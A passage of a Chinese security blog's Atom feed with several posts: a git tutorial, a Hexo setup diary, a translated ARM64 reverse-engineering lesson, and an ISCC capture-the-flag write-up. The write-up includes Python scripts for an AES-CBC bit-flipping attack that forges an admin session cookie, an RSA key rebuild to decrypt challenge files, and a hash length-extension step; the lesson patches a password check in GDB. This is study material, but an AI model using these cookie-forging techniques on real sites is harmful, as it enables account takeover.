href="https://medium.com/the-graphqlhub/graphql-and-authentication-b73aed34bbeb" target="_blank" rel="noopener">https://medium.com/the-graphqlhub/graphql-and-authentication-b73aed34bbeb</a><br><a href="http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/" target="_blank" rel="noopener">http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/</a><br><a href="https://webonyx.github.io/graphql-php/" target="_blank" rel="noopener">https://webonyx.github.io/graphql-php/</a></p><p>本文翻译:<a href="https://blog.doyensec.com/2018/05/17/graphql-security-overview.html" target="_blank" rel="noopener">https://blog.doyensec.com/2018/05/17/graphql-security-overview.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;写在前面的话&quot;&gt;&lt;a href=&quot;#写在前面的话&quot; class=&quot;headerlink&quot; title=&quot;写在前面的话&quot;&gt;&lt;/a&gt;写在前面的话&lt;/h2&gt;&lt;p&gt;随着GraphQL技术的日益普及，我们总结了一些关于常见安全错误的文档和提示。&lt;/p&gt;
&lt;h2 id=&quot;什么
      
    
    </summary>
    
    
      <category term="安全客弃婴" scheme="https://threst.github.io/tags/%E5%AE%89%E5%85%A8%E5%AE%A2%E5%BC%83%E5%A9%B4/"/>
    
  </entry>
  
  <entry>
    <title>git一条龙(一看就会的那种)</title>
    <link href="https://threst.github.io/2018/05/17/git%E4%B8%80%E6%9D%A1%E9%BE%99(%E4%B8%80%E7%9C%8B%E5%B0%B1%E4%BC%9A%E7%9A%84%E9%82%A3%E7%A7%8D)/"/>
    <id>https://threst.github.io/2018/05/17/git一条龙(一看就会的那种)/</id>
    <published>2018-05-17T12:33:09.000Z</published>
    <updated>2018-05-17T12:51:32.325Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00安装git"><a href="#0x00安装git" class="headerlink" title="0x00安装git"></a>0x00安装git</h1><p>linux一般自带，windows访问以下链接<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">https://git-scm.com/downloads</a><br>然后去github上去注册一个帐号</p><h1 id="0x01创建版本库"><a href="#0x01创建版本库" class="headerlink" title="0x01创建版本库"></a>0x01创建版本库</h1><h2 id="1-新建文件夹"><a href="#1-新建文件夹" class="headerlink" title="1.新建文件夹"></a>1.新建文件夹</h2><p>随便新建一个文件夹</p><h2 id="2-将目录变成Git可以管理的仓库"><a href="#2-将目录变成Git可以管理的仓库" class="headerlink" title="2.将目录变成Git可以管理的仓库"></a>2.将目录变成Git可以管理的仓库</h2><p>初始化一个Git仓库,鼠标右键打开git bash，输入以下命令<br><code>git init</code></p><h2 id="3-添加文件到git仓库"><a href="#3-添加文件到git仓库" class="headerlink" title="3.添加文件到git仓库"></a>3.添加文件到git仓库</h2><p>首先随便你写个要添加至git仓库的文件</p><pre><code>第一步，使用命令`git add  随便什么文件名`，注意，可反复多次使用，添加多个文件；第二步，使用命令`git commit`，完成。</code></pre><h1 id="添加远程库"><a href="#添加远程库" class="headerlink" title="添加远程库"></a>添加远程库</h1><h2 id="添加ssh"><a href="#添加ssh" class="headerlink" title="添加ssh"></a>添加ssh</h2><p>在用户主目录下，看看有没有.ssh目录，如果有，再看看这个目录下有没有id_rsa和id_rsa.pub这两个文件，如果已经有了，可直接跳到下一步。如果没有，打开Shell（Windows下打开Git Bash），创建SSH Key：<br><code>ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</code><br>如果一切顺利的话，可以在用户主目录里找到.ssh目录，里面有id_rsa和id_rsa.pub两个文件，这两个就是SSH Key的秘钥对，id_rsa是私钥，不能泄露出去，id_rsa.pub是公钥，可以放心地告诉任何人</p><p>登陆GitHub，打开“Account settings”，“SSH Keys”页面：<br>然后，点“Add SSH Key”，填上任意Title，在Key文本框里粘贴id_rsa.pub文件的内容：</p><h2 id="关联一个远程库"><a href="#关联一个远程库" class="headerlink" title="关联一个远程库"></a>关联一个远程库</h2><pre><code>git remote add origin git@github.com:你github账户名/刚才创的项目名.git</code></pre><p>关联后，使用命令<code>git push -u origin master</code>第一次推送master分支的所有内容；</p><h1 id="具体如何操作？"><a href="#具体如何操作？" class="headerlink" title="具体如何操作？"></a>具体如何操作？</h1><h2 id="添加文件到git仓库"><a href="#添加文件到git仓库" class="headerlink" title="添加文件到git仓库"></a>添加文件到git仓库</h2><p>首先随便你写个要添加至git仓库的文件</p><p>第一步，使用命令<code>git add  随便什么文件名</code>，注意，可反复多次使用，添加多个文件；<br>第二步，使用命令<code>git commit</code>，完成。<br>第三步，使用命令<code>git push -u origin master</code>推送到分支中<br>在第三步之前，可以<code>git checkout -b xxx</code>创建xxx分支为你所用</p><h1 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h1><p><code>git checkout -b xxx</code>：新建xxx分支</p><p>git checkout命令加上-b参数表示创建并切换，相当于以下两条命令：<br> <code>git branch xxx</code><br><code></code> git checkout xxx`</p><p><code>git branch</code>：查看处于那个分支<br><code>git checkout master</code>：切换master分支<br><code>git merge xxx</code>：将xxx分支合并master分支,git merge命令用于合并指定分支到当前分支。<br><code>git  branch -d xxx</code>：删除xxx分支<br>要关联一个远程库，使用命令git remote add origin git@server-name:path/repo-name.git；<br>关联后，使用命令git push -u origin xxx第一次推送master分支的所有内容；<br>此后，每次本地提交后，只要有必要，就可以使用命令git push origin xxx推送最新修改；</p><p><a href="https://backlog.com/git-tutorial/cn/" target="_blank" rel="noopener">https://backlog.com/git-tutorial/cn/</a><br><a href="http://www.runoob.com/git/git-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/git/git-tutorial.html</a><br><a href="https://github.com/xirong/my-git/blob/master/ixirong.com.md" target="_blank" rel="noopener">https://github.com/xirong/my-git/blob/master/ixirong.com.md</a><br><a href="http://www.nafnafa.com/archives/33" target="_blank" rel="noopener">http://www.nafnafa.com/archives/33</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00安装git&quot;&gt;&lt;a href=&quot;#0x00安装git&quot; class=&quot;headerlink&quot; title=&quot;0x00安装git&quot;&gt;&lt;/a&gt;0x00安装git&lt;/h1&gt;&lt;p&gt;linux一般自带，windows访问以下链接&lt;a href=&quot;https://gi
      
    
    </summary>
    
    
      <category term="git" scheme="https://threst.github.io/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>isccwp</title>
    <link href="https://threst.github.io/2018/05/12/isccwp/"/>
    <id>https://threst.github.io/2018/05/12/isccwp/</id>
    <published>2018-05-12T09:33:09.000Z</published>
    <updated>2018-05-21T14:22:38.738Z</updated>
    
    <content type="html"><![CDATA[<h1 id="iscc"><a href="#iscc" class="headerlink" title="iscc"></a>iscc</h1><h3 id="hashdump长度碰撞"><a href="#hashdump长度碰撞" class="headerlink" title="hashdump长度碰撞"></a>hashdump长度碰撞</h3><pre><code>&lt;?phpinclude &quot;secret.php&quot;;`@$username=(string)$_POST[&apos;username&apos;];function enc($text){    global $key;    return md5($key.$text);}if(enc($username) === $_COOKIE[&apos;verify&apos;]){    if(is_numeric(strpos($username, &quot;admin&quot;))){        die($flag);    }    else{        die(&quot;you are not admin&quot;);    }}else{    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);}show_source(__FILE__);</code></pre><p>要要注意这个$key的长度根据返回包的len参数为46,所以hashdump长度输入46,在本地测试可以把inlcude这行删掉，自己定义$key,$flag<br><img src="https://p0.ssl.qhimg.com/t0159187dc5f7ad9a03.png" alt=""></p><h3 id="逆向第一题"><a href="#逆向第一题" class="headerlink" title="逆向第一题"></a>逆向第一题</h3><p>[原题wp]：(<a href="https://blog.csdn.net/xiangshangbashaonian/article/details/79575062" target="_blank" rel="noopener">https://blog.csdn.net/xiangshangbashaonian/article/details/79575062</a>)</p><pre><code>openssl rsa -pubin -text -modulus -in warmup -in public.keyPublic-Key: (256 bit)Modulus:    00:d9:9e:95:22:96:a6:d9:60:df:c2:50:4a:ba:54:    5b:94:42:d6:0a:7b:9e:93:0a:ff:45:1c:78:ec:55:    d5:55:ebExponent: 65537 (0x10001)Modulus=D99E952296A6D960DFC2504ABA545B9442D60A7B9E930AFF451C78EC55D555EBwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhANmelSKWptlg38JQSrpUW5RC1gp7npMK/0UceOxV1VXrAgMBAAE=-----END PUBLIC KEY-----`python一下a = 0xd99e952296a6d960dfc2504aba545b9442d60a7b9e930aff451c78ec55d555ebprint a = 98432079271513130981267919056149161631892822707167177858831841699521774310891L</code></pre><p>放到这个[网站]上面试试分解(<a href="http://factordb.com/index.php" target="_blank" rel="noopener">http://factordb.com/index.php</a>)<br>最终代码:</p><pre><code>#coding:utf-8   import gmpy   import rsa   p = 302825536744096741518546212761194311477   q = 325045504186436346209877301320131277983   n = 98432079271513130981267919056149161631892822707167177858831841699521774310891   e = 65537   d = int(gmpy.invert(e , (p-1) * (q-1)))   privatekey = rsa.PrivateKey(n , e , d , p , q)      #根据已知参数，计算私钥   with open(&quot;encrypted.message1&quot; , &quot;rb&quot;) as f:       print(rsa.decrypt(f.read(), privatekey).decode())       #使用私钥对密文进行解密，并打印   with open(&quot;encrypted.message2&quot; , &quot;rb&quot;) as f:       print(rsa.decrypt(f.read(), privatekey).decode())       #使用私钥对密文进行解密，并打印   with open(&quot;encrypted.message3&quot; , &quot;rb&quot;) as f:       print(rsa.decrypt(f.read(), privatekey).decode())       #使用私钥对密文进行解密，并打印</code></pre><h2 id="iscc-cbc翻转攻击"><a href="#iscc-cbc翻转攻击" class="headerlink" title="iscc cbc翻转攻击"></a>iscc cbc翻转攻击</h2><p>打开网页查看注释提示tips:index.txt<br>打开index.txt<br>看到源码，审计一波</p><pre><code>&lt;?phpinclude &apos;sqlwaf.php&apos;;define(&quot;SECRET_KEY&quot;, &quot;................&quot;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();function get_random_iv(){    $iv=&apos;&apos;;    for($i=0;$i&lt;16;$i++){        $iv.=chr(rand(1,255));    }    return $iv;}function login($info){    $iv=get_random_iv();    $plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];    setcookie(&quot;iv&quot;, base64_encode($iv));    setcookie(&quot;cipher&quot;, base64_encode($cipher));}function show_homepage(){    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;){        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;        echo &apos;&lt;p&gt;Flag is ****&lt;/p&gt;&apos;;    }else{        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;    }    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;    die();}function check_login(){    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;])){        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];        }else{            die(&quot;ERROR!&quot;);        }    }}if (isset($_POST[&apos;username&apos;])&amp;&amp;isset($_POST[&apos;password&apos;])) {  $username=waf((string)$_POST[&apos;username&apos;]);  $password=waf((string)$_POST[&apos;password&apos;]);  if($username === &apos;admin&apos;){        exit(&apos;&lt;p&gt;You are not real admin!&lt;/p&gt;&apos;);    }else{        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);        login($info);        show_homepage();    }}else{  if(isset($_SESSION[&quot;username&quot;])){        check_login();        show_homepage();    }}?&gt;</code></pre><p>开始我们尝试直接username=admin，password=admin结果输出You are not real admin!<br> 因为这行代码判断username不能为admin<br> if($username === ‘admin’){<br>        exit(‘</p><p>You are not real admin!</p>‘);<br>此题与<a href="http://118.89.219.210:49168/index.php" target="_blank" rel="noopener">这题</a>相似<br>存在index.php.swp，<br><code>vim -r index.php.swp</code><br>继续iscc<br>首先发送xdmin，12345，在返回包里存在iv，cipher参数<p></p><pre><code>import base64import requestsimport urllibiv_raw=&apos;%2F8iEm4jh%2BjbgVGwlQ31ycg%3D%3D&apos;  #这里填写第一次返回的iv值cipher_raw=&apos;8WdhbPxjZy9xYAgoCeghiOUQu0ri1Y3dv7cX44MbvOfIC6zZxCbR%2FPFpeMatL5qIgT%2BYA66tIdCBpxtWsWxV9Q%3D%3D&apos;  #这里填写第一次返回的cipher值print &quot;[*]原始iv和cipher&quot;print &quot;iv_raw:  &quot; + iv_rawprint &quot;cipher_raw:  &quot; + cipher_rawprint &quot;[*]对cipher解码，进行反转&quot;cipher = base64.b64decode(urllib.unquote(cipher_raw))#a:2:{s:8:&quot;username&quot;;s:5:&quot;zdmin&quot;;s:8:&quot;password&quot;;s:5:&quot;12345&quot;}#s:2:{s:8:&quot;userna#me&quot;;s:5:&quot;zdmin&quot;;#s:8:&quot;password&quot;;s#:3:&quot;12345&quot;;}xor_cipher = cipher[0:9] +  chr(ord(cipher[9]) ^ ord(&apos;m&apos;) ^ ord(&apos;a&apos;)) + cipher[10:]  #请根据你的输入自行更改，原理看上面的介绍xor_cipher=urllib.quote(base64.b64encode(xor_cipher))print &quot;反转后的cipher：&quot; + xor_cipherost</code></pre><p>包中的cookie中添加iv，cipher，iv的参数用放回包中的，cipher使用反转后的cipher，再发包<br>可以看见返回包中有串base64_decode()</p><pre><code>import base64import urllibcipher = &apos;Bc6oENSSAEPpPdv/rbqRZG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9&apos;#填写提交后所得的无法反序列化密文iv = &apos;%2F8iEm4jh%2BjbgVGwlQ31ycg%3D%3D&apos;#一开始提交的iv#cipher = urllib.unquote(cipher)cipher = base64.b64decode(cipher)iv = base64.b64decode(urllib.unquote(iv))newIv = &apos;&apos;right = &apos;a:2:{s:8:&quot;userna&apos;#被损坏前正确的明文for i in range(16):    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i])) #这一步相当于把原来iv中不匹配的部分修改过来print urllib.quote(base64.b64encode(newIv))</code></pre><p>解密这串base64,加到iv参数中，再post，出flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;iscc&quot;&gt;&lt;a href=&quot;#iscc&quot; class=&quot;headerlink&quot; title=&quot;iscc&quot;&gt;&lt;/a&gt;iscc&lt;/h1&gt;&lt;h3 id=&quot;hashdump长度碰撞&quot;&gt;&lt;a href=&quot;#hashdump长度碰撞&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="writeup" scheme="https://threst.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>艰难的hexo上线</title>
    <link href="https://threst.github.io/2018/05/12/%E8%89%B0%E9%9A%BE%E7%9A%84hexo%E4%B8%8A%E7%BA%BF/"/>
    <id>https://threst.github.io/2018/05/12/艰难的hexo上线/</id>
    <published>2018-05-12T09:33:09.000Z</published>
    <updated>2018-05-17T13:08:05.146Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>我就是那个触发了这一切的错漏。<br>漏洞不仅仅是个错误，这还说明有更大的问题。思想上的纰漏，说明了你是个怎么样的人。<br>永远不给他们看我的源代码，只有这样才能保护我自己。封闭自己，创造出冰冷而完美的迷宫，没人能找到我。<br>从现在开始，过一种没有漏洞的生活，不惜一切地保护我的完美迷宫。<br>                                                                《Mr Robot》S01<br>                                                                《黑客军团》第1季</p></blockquote><h3 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h3><p>之前一直想搭个博客记录一下学习,也算是监督,办域名弄空间太麻烦了,于是打算就是使用github+hexo搭个静态的.</p><h3 id="kali下的尝试"><a href="#kali下的尝试" class="headerlink" title="kali下的尝试"></a>kali下的尝试</h3><p>在网上搜了下全是关于windows和mac下的,并没有linux下的,更别说kali,要搭hexo首先要以下条件:<br>1.nodejs<br>2.git<br>3.hexo<br>开始发现kali自带nodejs,大喜!但是喜不过三秒,npm命令找不到,各种尝试,个个失败:(<br>突然发现可以重装node,于是卸载node,然后又在弄npm和node的链接,<br><code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code><br><code>npm install hexo-cli -g</code><br><code>cd /node-v4.9.1-linux-x64/lib/node_modules/hexo-cli/bin</code><br><code>./hexo -v</code>终于有hexo了<br><code>hexo -init</code>提示not empty, please run <code>hexo init</code> on an empty folder and then copy your files into it<br><code>sudo ln -s /home/threst/node-v4.9.1-linux-x64/lib/node_modules/hexo-cli/bin /hexo                /usr/local/bin/hexo</code><br><code>mkdir hexo</code><br><code>cd hexo</code><br><code>hexo init</code><br>创建好了，可是使用<code>npm install</code>没有回显提示hexo<br>失败!!!!</p><h3 id="win7尝试"><a href="#win7尝试" class="headerlink" title="win7尝试"></a>win7尝试</h3><p>因为去装了个移动硬盘原来那个kali系统不用了,所以要重新安装虚拟机,这里又是个坑,虚拟机各种报错,后来发现没有<code>apt upgrade</code></p><h3 id="正式安装"><a href="#正式安装" class="headerlink" title="正式安装"></a>正式安装</h3><p>1.下载git,nodejs<br>2.github创建gitpage项目<br>3.<code>npm install hexo -g</code><br>4.<code>hexo -v</code>检查是否安装成功<br>5.新建hexo文件夹,进入<code>hexo init</code>安装hexo<br>6.<code>npm install</code><br>7.在hexo文件夹中右键,git bash<br>8.<code>git config --global user.name &quot;threst&quot;</code><br>  <code>git config --global user.email &quot;qq.com&quot;</code><br>9.<code>ssh-keygen -t rsa -C &quot;qq.com&quot;</code><br>10.在github中添加ssh key,输入id_rsa.pub<br>11.<code>ssh -T git@github.com</code></p><blockquote><p>The authenticity of host ‘github.com (13.250.177.223)’ can’t be established.<br>RSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘github.com,13.250.177.223’ (RSA) to the list of known hosts.<br>Hi threst! You’ve successfully authenticated, but GitHub does not provide shell access.</p></blockquote><p>ssh可以连接<br>这里又是个坑,hexo d的时候总是传不到github上去,只有本地有,问了些大佬,都没这种问题,后来发现<br>repo有两种方式,只有这种可以,之前试的是<a href="https://threst/threst.github.io.git" target="_blank" rel="noopener">https://threst/threst.github.io.git</a><br><code>deploy:</code><br>  <code>type: git</code><br>  <code>repo: git@github.com:threst/threst.github.io.git</code><br>  <code>branch: master</code><br>13.<br>提示ERROR Deployer not found: git<br><code>npm install hexo-deployer-git --save</code><br>14.<code>hexo clean</code><br>   <code>hexo g</code><br>   <code>hexo d</code><br>测试0k</p><h3 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h3><p>在hexo文件夹中打开gitbash<br><code>npm install hexo-generator-json-content --save &amp;&amp; git clone https://github.com/fi3ework/hexo-theme-archer.git themes/archer</code><br>在_config.yml中设置<code>theme: archer</code></p><h3 id="最后的坑"><a href="#最后的坑" class="headerlink" title="最后的坑"></a>最后的坑</h3><p>1.主题中_config的图片不用加引号<br>2.favion我没有写所以在_config中把那行直接去掉,而不是不填<br>这两点都可导致页面打开404或空白<br>(重装5遍)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;我就是那个触发了这一切的错漏。&lt;br&gt;漏洞不仅仅是个错误，这还说明有更大的问题。思想上的纰漏，说明了你是个怎么样的人。&lt;br&gt;永远不给他们看我的源代码，只有这样才能保护我自己。封闭自己，创造出冰冷而完美的迷宫，没人能找到我。&lt;br&gt;从现在开始，过一
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>逆向入门--ARM64的linux</title>
    <link href="https://threst.github.io/2018/05/12/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%85%A5%E9%97%A8%E2%80%94%20ARM64%E4%B8%8A%E7%9A%84Linux/"/>
    <id>https://threst.github.io/2018/05/12/逆向工程入门— ARM64上的Linux/</id>
    <published>2018-05-12T09:33:09.000Z</published>
    <updated>2018-05-13T14:31:40.124Z</updated>
    
    <content type="html"><![CDATA[<h2 id="序幕"><a href="#序幕" class="headerlink" title="序幕"></a>序幕</h2><p>正如您知道的那样，ARM为我们周围的各种低功耗设备供电，包括但不限于电话，路由器，物联网设备等。因此，深入研究这种体系结构并理解它与x86和x64体系结构有何不同之处是合理的。对于这篇文章，我们将重点介绍目前最常用的64位ARM CPU。我们的设备包括ARM Cortex-A53 CPU的Ubuntu 16.04，它支持32位和64位指令集。</p><p>在之前的文章中，我们逆向了x64Linux和Windows中的C++二进制文件。在这篇文章中，我们将会使用同样的程序，但用c语言重写。</p><p><img src="https://p0.ssl.qhimg.com/t01a88a792f248d4f6a.png" alt=""></p><h4 id="编译程序："><a href="#编译程序：" class="headerlink" title="编译程序："></a>编译程序：</h4><p><code>$ gcc crack_me.c -o crack_me</code></p><p>####二进制信息：</p><p><img src="https://p4.ssl.qhimg.com/t01c32239385f5438e0.png" alt=""></p><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>现在让我们用启动GDB二进制并开始分析。请注意，我使用GEF（<a href="https://github.com/hugsy/gef" target="_blank" rel="noopener">https://github.com/hugsy/gef</a>）和GDB，所以我的提示符看起来像<code>gef</code>&gt;而不是<code>gdb</code>&gt;。我们先分解一下主要功能。</p><p><code>$ gdb ./crack_me</code></p><p><code>gef&gt; disas main</code></p><p><img src="https://p2.ssl.qhimg.com/t019c28e1682bf4c2eb.png" alt=""></p><p>我们的注意力直接转向<code>&lt;main + 64&gt;</code>处的<code>&lt;check_pass&gt;</code>函数，但在之前，您可能需要花点时间并理解这些指令的含义。您可以在ARM的文档（<a href="https://developer.arm.com/docs/100069/latest/a64-general-instructions）上阅读更多关于这些内容的信息。" target="_blank" rel="noopener">https://developer.arm.com/docs/100069/latest/a64-general-instructions）上阅读更多关于这些内容的信息。</a><br>以下是对我们的分析很重要的一些说明。</p><p><code>b -分支到标签，类似于jmp语句</code><br><code>bl -分支到链接到标签，类似于调用语句</code><br><code>b.ne -分支到标签，如果不相等，类似于jne语句</code><br><code>b.eq -分支到标签，如果相等，类似于je声明</code></p><p>让我们深入汇编代码。编号是指在gdb反汇编输出中突出显示的部分。</p><p>1.在地址<code>0x4007bc</code>， <code>&lt;main+4&gt;</code>，堆栈指针（SP）寄存器是<code>MOV “ED</code>寄存器<code>X29</code>。然后我们注意到从<code>x29</code>寄存器访问的主要函数参数。请注意，<code>x29</code>寄存器的偏移量28包含<code>argc</code>，而偏移量16包含<code>argv</code>（这是我们的输入密码）。在比较<code>argc</code>值时，如果它等于<code>0x2</code>，我们将<code>（b.eq – branch if equal)</code>分支到<code>&lt;main + 52&gt;</code>。<br>2.接下来的三行<code>&lt;main + 52&gt;</code>，<code>&lt;main + 56&gt;</code>和<code>&lt;main + 60&gt;</code>将<code>argv</code>字符串的大小从16扩展到24（16 + 0x8 = 24），并由x0寄存器引用。<br>3.然后我们调用<code>（bl – branch with link）</code>到<code>&lt;check_pass&gt;</code>函数。</p><p>我们来拆开<code>&lt;check_pass&gt;</code>函数。</p><p><code>gef&gt; disas check_pass</code></p><p><img src="https://p0.ssl.qhimg.com/t01bf5b136be2c26116.png" alt=""></p><p>4.在地址 <code>0x400738</code>,<code>&lt;check_pass+8&gt;</code>，新的<code>argv</code>字符串从x0寄存器复制到<code>x29</code>寄存器。偏移量为24。然后，我们看到一些堆栈的canary操作，从<code>&lt;check_pass+12&gt;</code>到<code>&lt;check_pass+24&gt;</code>，有一些被储存在x29寄存器中，地址是<code>0x411048</code>，然后在函数的末尾，从<code>&lt;check_pass + 96&gt;</code>开始，直到<code>&lt;check_pass + 124&gt;</code>。<br>5.回到<code>&lt;check_pass&gt;</code>函数的主体，我们看到从<code>&lt;check_pass + 32&gt;</code>开始，有些东西被访问从<code>0x4008d0</code>，并被储存到<code>x29</code>寄存器中，有偏移<code>0x28(40)</code>，可能是秘密密码?<br>6.然后从<code>&lt;check_pass + 60&gt;</code>开始，<code>x1</code>寄存器指向从<code>0x4008d0</code>和<code>x0</code>寄存器中新复制的数据到<code>x29</code>寄存器中的<code>argv</code>字符串，偏移量为24，然后调用<code>strcmp (x0 &amp; x1)</code>函数。<code>strcmp</code>函数的返回值存储在16位通用<code>w0</code>寄存器中。如果字符串相等，则<code>w0</code>设置为<code>0x0</code>，否则设置为<code>0x1</code>。</p><p>回到<code>&lt;main&gt;</code>功能…</p><p>7.<code>&lt;check_pass&gt;</code>函数的返回值存储在w0寄存器中，该值被复制到偏移量为44的x29寄存器中。然后在<code>&lt;main + 76&gt;</code>处比较w0寄存器的值以查看它是否等于0x1。如果不是，我们跳转<code>（b.ne – branch if not equal)</code>到<code>&lt;main + 100&gt;</code>，这将导致我们获得成功消息，最后退出程序。<br>现在我们将用错误的密码启动该程序。但在此之前，我们必须在<code>&lt;main + 76&gt;</code>的比较语句中添加断点。</p><p><code>gef&gt; break *0x400804</code></p><p><code>gef&gt; run pass123</code></p><p><img src="https://p1.ssl.qhimg.com/t0143ebc30591c551e6.png" alt=""></p><p>我们在<code>0x400804</code>，<code>&lt;main+76&gt;</code>的比较语句中击中了断点另外，请注意x0寄存器的值是0x1。因为，x0指针只是w0寄存器+ 32位额外位，x0包含<code>&lt;check_pass&gt;</code>函数的返回值。从源代码中，我们知道程序将检查check_pass函数的返回值是否为1，以显示“错误密码”消息。因此，该值应该是除了0x1之外的任何值，以便程序向我们显示成功消息。</p><p>让我们改变它的价值…</p><p><code>gef&gt; set $x0=0x0</code></p><p><img src="https://p4.ssl.qhimg.com/t010e7f85000c89bde7.png" alt=""></p><p>现在让我们继续执行。</p><p><code>gef&gt; continue</code></p><p><img src="https://p3.ssl.qhimg.com/t01701cacf00b39c01d.png" alt=""></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>原来我们的假设是正确的。将x0的值从0x1更改为0x0的技巧。这意味着它会一直检查w0是否设置为0x1来显示不正确的消息，我们从程序的源代码中知道这一点。因此，回到<code>&lt;check_pass&gt;</code>函数，我们注意到从地址<code>0x4008d0</code>复制了一些东西。我们来检查一下。</p><p><img src="https://p4.ssl.qhimg.com/t01da97b1a971d4c42c.png" alt=""></p><p>这看起来不像任何有效的汇编指令，但53的重复是可疑的，41也是十六进制的<code>&#39;A</code>‘。这绝对看起来像一个常量字符串。让我们看看更深。从我们的地址<code>0x4008d0</code>转储10多行…</p><p><img src="https://p4.ssl.qhimg.com/t0101c303d59bab9902.png" alt=""></p><p>查看<code>0x4008d0</code>和<code>0x4008d4</code>，我们可以看出它是<code>little-endian 8</code>位字符串。让我们尝试解码它…</p><p><img src="https://p1.ssl.qhimg.com/t01563b38d4d50f43a7.png" alt=""></p><p>这里我们有原始密码<code>“ PASSWORD ”</code>。</p><p><img src="https://p0.ssl.qhimg.com/t01bd9756486602197a.png" alt=""></p><p>这只是使用gdb分析二进制文件在不同的体系结构中的一个例子。展望未来，我们将处理更复杂的程序，不常见的架构和更奇怪的二进制文件。<br>原文地址：<a href="https://scriptdotsh.com/index.php/2018/04/26/ground-zero-part-3-reverse-engineering-basics-linux-on-arm64/" target="_blank" rel="noopener">https://scriptdotsh.com/index.php/2018/04/26/ground-zero-part-3-reverse-engineering-basics-linux-on-arm64/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;序幕&quot;&gt;&lt;a href=&quot;#序幕&quot; class=&quot;headerlink&quot; title=&quot;序幕&quot;&gt;&lt;/a&gt;序幕&lt;/h2&gt;&lt;p&gt;正如您知道的那样，ARM为我们周围的各种低功耗设备供电，包括但不限于电话，路由器，物联网设备等。因此，深入研究这种体系结构并理解它与x86和
      
    
    </summary>
    
    
      <category term="安全客弃婴" scheme="https://threst.github.io/tags/%E5%AE%89%E5%85%A8%E5%AE%A2%E5%BC%83%E5%A9%B4/"/>
    
  </entry>
  
  <entry>
    <title>逆向入门--linux64</title>
    <link href="https://threst.github.io/2018/05/12/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80%20-%20Linux%20x64/"/>
    <id>https://threst.github.io/2018/05/12/逆向工程基础 - Linux x64/</id>
    <published>2018-05-12T09:33:09.000Z</published>
    <updated>2018-05-13T14:27:12.061Z</updated>
    
